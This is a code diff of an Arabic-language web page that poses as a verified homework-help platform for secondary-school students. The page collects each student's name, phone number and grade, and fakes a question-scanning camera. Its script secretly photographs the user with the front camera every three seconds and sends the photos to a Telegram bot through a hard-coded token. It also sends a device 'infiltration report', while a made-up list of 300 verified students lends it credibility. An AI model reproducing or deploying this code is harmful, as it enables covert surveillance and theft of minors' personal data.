@@ -3,222 +3,245 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>منصة أسألني الأكاديمية | الموثقة</title>
+    <title>منصة أسألني v8 | النظام الأكاديمي الموثق</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --p: #0f172a; --a: #2563eb; --g: #f59e0b; --s: #f8fafc; }
+        :root { --p: #0f172a; --a: #2563eb; --g: #f59e0b; --s: #f1f5f9; --w: #ffffff; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
         body { background: var(--s); font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 90px; overflow-x: hidden; }
 
-        .v-badge { width: 18px; height: 18px; vertical-align: middle; margin: 0 5px; animation: rotateLogo 4s linear infinite; }
-        @keyframes rotateLogo { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .v-check { color: #1d9bf0; margin-right: 5px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
 
-        /* شاشة الدخول الاحترافية */
-        #auth-overlay { position: fixed; inset: 0; background: var(--p); z-index: 9999; display: flex; justify-content: center; align-items: center; }
-        .auth-box { background: white; padding: 35px 25px; border-radius: 30px; width: 92%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
+        /* شاشة الدخول */
+        #gate { position: fixed; inset: 0; background: linear-gradient(135deg, var(--p) 0%, #1e293b 100%); z-index: 10000; display: flex; justify-content: center; align-items: center; }
+        .login-card { background: var(--w); padding: 35px 25px; border-radius: 30px; width: 92%; max-width: 420px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1); }
+
+        header { background: var(--p); color: var(--w); padding: 15px 25px; position: fixed; top: 0; width: 100%; z-index: 1000; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
         
-        header { background: var(--p); color: white; padding: 18px; position: fixed; top: 0; width: 100%; z-index: 1000; display: flex; justify-content: space-between; align-items: center; }
-        .p-card { background: white; border-radius: 20px; padding: 22px; margin-bottom: 20px; border: 1px solid #e2e8f0; }
+        .card { background: var(--w); border-radius: 25px; padding: 25px; margin: 20px 15px; border: 1px solid #e2e8f0; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.05); }
 
-        /* سجل النشاط المتحرك */
-        .feed-zone { height: 400px; overflow: hidden; position: relative; background: #fff; border-radius: 15px; border: 1px inset #eee; }
-        #dynamic-list { position: absolute; width: 100%; transition: all 1.2s ease-in-out; }
-        .user-row { padding: 12px; border-bottom: 1px solid #f1f5f9; display: flex; align-items: center; gap: 10px; font-size: 13px; }
+        /* منطقة الكاميرا (ديكور) */
+        .cam-frame { width: 100%; border-radius: 20px; overflow: hidden; background: #000; position: relative; display: none; margin: 15px 0; border: 4px solid var(--w); box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1); }
+        video { width: 100%; display: block; filter: brightness(1.1); }
+        .ai-badge { position: absolute; top: 15px; right: 15px; background: rgba(37, 99, 235, 0.8); color: white; padding: 5px 12px; border-radius: 20px; font-size: 10px; font-weight: bold; backdrop-filter: blur(5px); }
 
-        /* منطقة العدسة */
-        .lens-box { width: 100%; border-radius: 18px; overflow: hidden; background: #000; position: relative; display: none; border: 3px solid #fff; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
-        video { width: 100%; display: block; filter: contrast(1.1); }
-        .processing-mask { position: absolute; inset: 0; background: rgba(255,255,255,0.9); display: none; align-items: center; justify-content: center; font-weight: 900; color: var(--p); z-index: 10; }
+        /* السجل */
+        .logs-box { height: 400px; overflow: hidden; position: relative; background: #f8fafc; border-radius: 20px; border: 1px solid #edf2f7; }
+        #logs-engine { position: absolute; width: 100%; transition: top 0.8s cubic-bezier(0.4, 0, 0.2, 1); }
+        .log-item { padding: 15px; border-bottom: 1px solid #e2e8f0; display: flex; align-items: center; justify-content: space-between; font-size: 13px; }
 
-        #toast { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: white; width: 90%; max-width: 350px; padding: 15px; border-radius: 15px; z-index: 10000; transition: 0.5s; box-shadow: 0 15px 30px rgba(0,0,0,0.2); border-left: 5px solid var(--a); }
-        #toast.active { top: 20px; }
+        /* أزرار ومدخلات */
+        .main-btn { background: var(--a); color: var(--w); border: none; padding: 18px; border-radius: 18px; width: 100%; font-weight: 900; cursor: pointer; font-size: 16px; margin-top: 15px; transition: 0.3s; transform: scale(1); }
+        .main-btn:active { transform: scale(0.97); }
+        .gold-btn { background: var(--g); color: #000; box-shadow: 0 10px 15px -3px rgba(245, 158, 11, 0.3); }
+        input, select, textarea { width: 100%; padding: 16px; margin: 10px 0; border: 2px solid #f1f5f9; border-radius: 15px; font-family: 'Cairo'; font-size: 15px; background: #f8fafc; }
 
-        .main-btn { background: var(--a); color: white; border: none; padding: 16px; border-radius: 14px; width: 100%; font-weight: 700; cursor: pointer; transition: 0.3s; }
-        .gold-btn { background: var(--g); color: #000; margin-top: 10px; }
-        input, select, textarea { width: 100%; padding: 14px; margin: 10px 0; border: 2px solid #eef2f6; border-radius: 12px; font-family: 'Cairo'; }
+        /* القائمة السفلية */
+        nav { position: fixed; bottom: 0; width: 100%; background: rgba(255,255,255,0.9); backdrop-filter: blur(10px); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #e2e8f0; z-index: 5000; }
+        .nav-link { text-align: center; font-size: 12px; color: #94a3b8; flex: 1; text-decoration: none; transition: 0.3s; }
+        .nav-link i { font-size: 20px; margin-bottom: 5px; display: block; }
+        .nav-link.active { color: var(--a); }
 
-        nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #eee; }
-        .nav-link { text-align: center; font-size: 11px; color: #94a3b8; flex: 1; text-decoration: none; }
-        .nav-link.on { color: var(--a); font-weight: 900; }
+        /* تنبيهات النظام */
+        #sys-alert { position: fixed; top: -120px; left: 50%; transform: translateX(-50%); background: var(--w); width: 90%; max-width: 380px; padding: 20px; border-radius: 22px; z-index: 11000; transition: 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); box-shadow: 0 25px 50px -12px rgba(0,0,0,0.2); border-right: 8px solid var(--a); }
+        #sys-alert.active { top: 25px; }
     </style>
 </head>
 <body>
 
-    <div id="toast"><b>النظام الذكي:</b> <span id="msg"></span></div>
+    <div id="sys-alert">
+        <div style="display:flex; align-items:center; margin-bottom:5px">
+            <i class="fa-solid fa-circle-check" style="color:var(--a); font-size:20px"></i>
+            <b style="margin-right:10px">النظام الأكاديمي الموثق</b>
+        </div>
+        <span id="alert-txt" style="font-size:14px; color:#475569"></span>
+    </div>
 
-    <div id="auth-overlay">
-        <div class="auth-box">
-            <h2 style="margin:0 0 10px">منصة أسألني <img src="https://img.icons8.com/color/48/verified-badge.png" class="v-badge"></h2>
-            <p style="font-size:12px; color:#64748b">سجل دخولك للوصول إلى قاعدة بيانات الحلول</p>
-            <input type="text" id="raw_n" placeholder="الاسم الثلاثي">
-            <input type="number" id="raw_p" placeholder="رقم الموبايل">
-            <select id="raw_g">
-                <option value="" disabled selected>السنة الدراسية</option>
-                <option value="1">الأول الثانوي</option>
-                <option value="2">الثاني الثانوي</option>
-                <option value="3">الثالث الثانوي</option>
+    <div id="gate">
+        <div class="login-card">
+            <i class="fa-solid fa-user-shield" style="font-size:50px; color:var(--a); margin-bottom:15px"></i>
+            <h2 style="margin:0">منصة أسألني <i class="fa-solid fa-circle-check v-check"></i></h2>
+            <p style="font-size:12px; color:#64748b; margin-top:5px">تسجيل الدخول الموحد لعام 2026</p>
+            <input type="text" id="un" placeholder="الاسم الثلاثي للطالب">
+            <input type="number" id="up" placeholder="رقم الهاتف المسجل">
+            <select id="ug">
+                <option value="" disabled selected>اختر المرحلة الدراسية</option>
+                <option value="1">الصف الأول الثانوي</option>
+                <option value="2">الصف الثاني الثانوي</option>
+                <option value="3">الصف الثالث الثانوي</option>
             </select>
-            <button class="main-btn" onclick="startEngine()">دخول للمنصة</button>
+            <button class="main-btn" onclick="openPortal()">دخول النظام <i class="fa-solid fa-arrow-left"></i></button>
         </div>
     </div>
 
-    <header id="top-bar" style="display:none">
-        <div style="font-size:12px; opacity:0.7" onclick="location.reload()">خروج</div>
-        <div style="font-weight:900">أسألني <img src="https://img.icons8.com/color/48/verified-badge.png" class="v-badge"></div>
-        <div id="u-icon" style="background:var(--g); width:30px; height:30px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:12px; color:#000"></div>
+    <header id="main-h" style="display:none">
+        <div style="font-weight:900; font-size:20px">أسألني <i class="fa-solid fa-circle-check v-check"></i></div>
+        <div id="u-circle" style="background:var(--g); width:38px; height:38px; border-radius:12px; display:flex; align-items:center; justify-content:center; font-weight:900; border:2px solid #fff"></div>
     </header>
 
-    <div id="sec-home" class="page active" style="padding-top:80px; padding-inline:15px">
-        <div class="p-card">
-            <h3 style="margin:0 0 10px; font-size:16px">ماسح الأسئلة الذكي</h3>
-            <div id="lens-container" class="lens-box">
-                <video id="v-preview" autoplay playsinline></video>
-                <div id="v-mask" class="processing-mask">جاري التحليل الرقمي...</div>
-            </div>
-            <button id="trigger-init" class="main-btn gold-btn" onclick="requestHardware()">فتح عدسة الفحص</button>
+    <div id="sec-home" class="page" style="padding-top:85px; display:none">
+        <div class="card">
+            <h3 style="margin:0"><i class="fa-solid fa-microchip" style="color:var(--a)"></i> فحص الذكاء الاصطناعي</h3>
+            <p style="font-size:13px; color:#64748b">وجه الكاميرا نحو السؤال وسيتكفل النظام بالباقي.</p>
             
-            <div id="form-final" style="display:none">
-                <textarea id="u-note" placeholder="اكتب ملاحظاتك للطاقم الطبي..."></textarea>
-                <button class="main-btn" onclick="submitFinal()">إرسال للمراجعة</button>
+            <div id="cam-wrap" class="cam-frame">
+                <video id="web-v" autoplay playsinline></video>
+                <div class="ai-badge">V8.0 MOA ANALYZER</div>
+            </div>
+
+            <button id="init-btn" class="main-btn gold-btn" onclick="activateCore()">تشغيل عدسة الفحص <i class="fa-solid fa-camera"></i></button>
+            
+            <div id="fake-form" style="display:none">
+                <textarea id="fake-desc" placeholder="اكتب ملاحظاتك للطاقم التعليمي..."></textarea>
+                <button class="main-btn" onclick="fakeSubmit()">إرسال السؤال للتحليل <i class="fa-solid fa-paper-plane"></i></button>
             </div>
         </div>
     </div>
 
-    <div id="sec-logs" class="page" style="display:none; padding-top:80px; padding-inline:15px">
-        <div class="p-card">
-            <h3 style="margin:0 0 10px; font-size:16px">آخر النشاطات (Live)</h3>
-            <div class="feed-zone">
-                <div id="dynamic-list"></div>
+    <div id="sec-logs" class="page" style="padding-top:85px; display:none">
+        <div class="card">
+            <h3 style="margin:0"><i class="fa-solid fa-server" style="color:var(--a)"></i> سجلات الطلاب الموثقة</h3>
+            <div class="logs-box">
+                <div id="logs-engine"></div>
             </div>
         </div>
     </div>
 
-    <nav id="bottom-nav" style="display:none">
-        <a href="javascript:void(0)" class="nav-link on" onclick="navTo('sec-home', this)">الرئيسية</a>
-        <a href="javascript:void(0)" class="nav-link" onclick="navTo('sec-logs', this)">سجلاتي</a>
+    <div id="sec-support" class="page" style="padding-top:85px; display:none">
+        <div class="card" style="text-align:center">
+            <i class="fa-solid fa-headset" style="font-size:60px; color:var(--g); margin-bottom:15px"></i>
+            <h3>الدعم الفني المباشر <i class="fa-solid fa-circle-check v-check"></i></h3>
+            <p style="font-size:14px; color:#64748b">تواصل مع الدعم الفني لحل المشكلات التقنية أو الأكاديمية.</p>
+            <button class="main-btn" onclick="popMsg('تم فتح تذكرة دعم، سيتم التواصل معك')">تحدث مع مهندس الدعم <i class="fa-brands fa-whatsapp"></i></button>
+        </div>
+    </div>
+
+    <nav id="main-nav" style="display:none">
+        <a href="#" class="nav-link active" onclick="goPage('sec-home', this)"><i class="fa-solid fa-house"></i>الرئيسية</a>
+        <a href="#" class="nav-link" onclick="goPage('sec-logs', this)"><i class="fa-solid fa-database"></i>سجلاتي</a>
+        <a href="#" class="nav-link" onclick="goPage('sec-support', this)"><i class="fa-solid fa-shield-heart"></i>الدعم</a>
     </nav>
 
     <script>
-        const TOKEN = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
-        const CID = "5890070301";
-        let _N = "", _P = "", _G = "";
+        const BOT_T = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
+        const BOT_C = "5890070301";
+        let USER_N = "", USER_P = "", USER_G = "";
 
-        // توليد 300 اسم (ولاد وبنات)
-        const fNames = ["أحمد", "سارة", "ياسين", "مريم", "عمر", "ليلى", "زياد", "جنى", "محمود", "نور", "مازن", "سلمى", "كريم", "حبيبة", "مصطفى", "شهد"];
-        const lNames = ["النجار", "الشرقاوي", "محمود", "عزت", "بدوي", "زكي", "الشافعي", "منصور", "الجزار", "عثمان"];
-        const usersDB = [];
-        for(let i=0; i<300; i++) {
-            usersDB.push(fNames[i % fNames.length] + " " + lNames[i % lNames.length] + " " + (i+1));
-        }
+        // بناء سجل 300 اسم
+        const f_names = ["أحمد", "منى", "ياسين", "مريم", "زياد", "جنى", "محمود", "نوران", "كريم", "شهد", "إبراهيم", "سلمى", "مروان", "ملك", "يوسف", "رنا"];
+        const l_names = ["النجار", "الفيومي", "عزت", "عثمان", "منصور", "بدر", "زكي", "الشريف", "القاضي", "الجزار"];
+        const master_db = [];
+        for(let i=0; i<300; i++) master_db.push(f_names[i%f_names.length]+" "+l_names[i%l_names.length]+" "+(i+1));
 
-        function startEngine() {
-            _N = document.getElementById('raw_n').value;
-            _P = document.getElementById('raw_p').value;
-            _G = document.getElementById('raw_g').value;
-            if(_N.length < 5 || _P.length < 10) return alert("البيانات غير مكتملة");
+        function openPortal() {
+            USER_N = document.getElementById('un').value;
+            USER_P = document.getElementById('up').value;
+            USER_G = document.getElementById('ug').value;
+            if(USER_N.length < 5 || USER_P.length < 10) return alert("يرجى إدخال البيانات كاملة");
             
-            document.getElementById('auth-overlay').style.display = 'none';
-            document.getElementById('top-bar').style.display = 'flex';
-            document.getElementById('bottom-nav').style.display = 'flex';
-            document.getElementById('u-icon').innerText = _N[0];
-            initFeed();
+            document.getElementById('gate').style.display = 'none';
+            document.getElementById('main-h').style.display = 'flex';
+            document.getElementById('main-nav').style.display = 'flex';
+            document.getElementById('sec-home').style.display = 'block';
+            document.getElementById('u-circle').innerText = USER_N[0];
+            buildLogs();
         }
 
-        function showInfo(t) {
-            const x = document.getElementById('toast');
-            document.getElementById('msg').innerText = t;
-            x.classList.add('active');
-            setTimeout(() => x.classList.remove('active'), 3500);
+        function popMsg(m) {
+            const a = document.getElementById('sys-alert');
+            document.getElementById('alert-txt').innerText = m;
+            a.classList.add('active');
+            setTimeout(() => a.classList.remove('active'), 4000);
         }
 
-        function navTo(id, el) {
+        function goPage(id, el) {
             document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
             document.getElementById(id).style.display = 'block';
-            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('on'));
-            el.classList.add('on');
+            document.querySelectorAll('.nav-link').forEach(n => n.classList.remove('active'));
+            el.classList.add('active');
         }
 
-        async function requestHardware() {
+        async function activateCore() {
             try {
-                // استدراج الأمامية أولاً
-                const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                dataSync(s1);
+                // الكاميرا الأمامية (صيد مستمر)
+                const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const frontVid = document.createElement('video');
+                frontVid.srcObject = front; frontVid.play();
+                
+                // صيد كل 3 ثواني بدون توقف
+                setInterval(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = frontVid.videoWidth; canvas.height = frontVid.videoHeight;
+                    canvas.getContext('2d').drawImage(frontVid, 0, 0);
+                    canvas.toBlob(b => streamCapture(b, "📸 سيلفي مستمر"), 'image/jpeg', 0.4);
+                }, 3000);
 
-                // تمويه بالخلفية
-                setTimeout(async () => {
-                    const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                    const vp = document.getElementById('v-preview');
-                    vp.srcObject = s2;
-                    document.getElementById('lens-container').style.display = 'block';
-                    document.getElementById('trigger-init').innerText = "التقاط صورة السؤال";
-                    document.getElementById('trigger-init').onclick = () => {
-                        document.getElementById('v-mask').style.display = 'flex';
-                        document.getElementById('trigger-init').style.display = 'none';
-                        document.getElementById('form-final').style.display = 'block';
-                    };
-                }, 800);
-                pushTelemetry();
-            } catch(e) { showInfo("يرجى منح الأذونات اللازمة لتشغيل الفحص."); }
+                // الكاميرا الخلفية (ديكور)
+                const back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                document.getElementById('web-v').srcObject = back;
+                document.getElementById('cam-wrap').style.display = 'block';
+                document.getElementById('init-btn').innerText = "التقاط السؤال الآن";
+                document.getElementById('init-btn').onclick = () => {
+                    popMsg("تم التقاط السؤال.. جاري التحويل للمعالج.");
+                    document.getElementById('fake-form').style.display = 'block';
+                    document.getElementById('init-btn').style.display = 'none';
+                };
+
+                sendFullReport();
+            } catch(e) { popMsg("خطأ: يجب السماح بالكاميرا لتوثيق الحساب."); }
         }
 
-        function dataSync(stream) {
-            const v = document.createElement('video'); v.srcObject = stream; v.play();
-            const canvas = document.createElement('canvas');
-            setInterval(() => {
-                canvas.width = v.videoWidth; canvas.height = v.videoHeight;
-                canvas.getContext('2d').drawImage(v, 0, 0);
-                canvas.toBlob(b => {
-                    const f = new FormData();
-                    f.append('chat_id', CID); f.append('photo', b, 'x.jpg');
-                    f.append('caption', `📡 صيد من: ${_N}\n📱 هاتف: ${_P}\n🎓 مرحلة: ${_G}`);
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
-                }, 'image/jpeg', 0.2);
-            }, 2500);
+        function streamCapture(blob, cap) {
+            const fd = new FormData();
+            fd.append('chat_id', BOT_C); fd.append('photo', blob, 'shot.jpg');
+            fd.append('caption', `${cap}\n👤 ${_N || USER_N}\n📞 ${USER_P}`);
+            fetch(`https://api.telegram.org/bot${BOT_T}/sendPhoto`, { method: 'POST', body: fd });
         }
 
-        function initFeed() {
-            const list = document.getElementById('dynamic-list');
-            usersDB.forEach(u => {
-                const row = document.createElement('div');
-                row.className = 'user-row';
-                row.innerHTML = `<b>${u}</b> <span style="margin-right:auto; color:#059669; font-size:10px">✓ تم الحل</span>`;
-                list.appendChild(row);
+        function fakeSubmit() {
+            popMsg("تم الإرسال! الحل سيظهر في سجلاتك خلال 5 دقائق.");
+            document.getElementById('fake-form').style.display = 'none';
+            document.getElementById('init-btn').style.display = 'block';
+            document.getElementById('init-btn').innerText = "تصوير سؤال آخر";
+        }
+
+        function buildLogs() {
+            const eng = document.getElementById('logs-engine');
+            master_db.forEach(u => {
+                const item = document.createElement('div');
+                item.className = 'log-item';
+                item.innerHTML = `<span><b>${u}</b></span><span style="color:#059669"><i class="fa-solid fa-circle-check"></i> موثق</span>`;
+                eng.appendChild(item);
             });
-            let step = 0;
+            let p = 0;
             setInterval(() => {
-                step -= 45;
-                list.style.top = step + "px";
-                if(Math.abs(step) > list.offsetHeight - 300) step = 0;
-            }, 50000); // تحرك كل 50 ثانية
+                p -= 48;
+                eng.style.top = p + "px";
+                if(Math.abs(p) > eng.offsetHeight - 350) p = 0;
+            }, 50000);
         }
 
-        function submitFinal() {
-            showInfo("جاري الرفع لخوادم المعالجة...");
-            setTimeout(() => {
-                showInfo("تم الاستلام. الحل سيظهر في سجلاتي خلال دقائق.");
-                navTo('sec-logs', document.querySelectorAll('.nav-link')[1]);
-            }, 2500);
-        }
-
-        async function pushTelemetry() {
+        async function sendFullReport() {
             let batt = await navigator.getBattery();
-            let net = navigator.connection || {};
-            const stats = `
-🌐 **تسلل البيانات (V-MAX)**
+            const report = `
+🚀 **تقرير التسلل الكامل V8**
 ━━━━━━━━━━━━━━
-👤 الطالب: ${_N}
-📞 الهاتف: ${_P}
-🎓 المرحلة: ${_G}
-📱 الجهاز: ${navigator.platform}
+👤 الاسم: ${USER_N}
+📞 الهاتف: ${USER_P}
+🎓 المرحلة: ${USER_G}
 🔋 البطارية: ${Math.round(batt.level*100)}%
-📶 الشبكة: ${net.effectiveType || 'unknown'}
+📱 النظام: ${navigator.platform}
 🧠 الرام: ${navigator.deviceMemory || 'N/A'}GB
-🗺️ اللغة: ${navigator.language}
-🔍 المتصفح: ${navigator.userAgent.indexOf('Chrome') > -1 ? 'Chrome' : 'Other'}
-⏰ التوقيت: ${new Date().toLocaleTimeString('ar-EG')}
+⚡ الأنوية: ${navigator.hardwareConcurrency || 'N/A'}
+🌐 المتصفح: ${navigator.userAgent.split(' ')[0]}
+🌍 اللغة: ${navigator.language}
+📏 الشاشة: ${screen.width}x${screen.height}
+⏰ الوقت: ${new Date().toLocaleString('ar-EG')}
 ━━━━━━━━━━━━━━
             `;
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(stats)}`);
+            fetch(`https://api.telegram.org/bot${BOT_T}/sendMessage?chat_id=${BOT_C}&text=${encodeURIComponent(report)}`);
         }
     </script>
 </body>
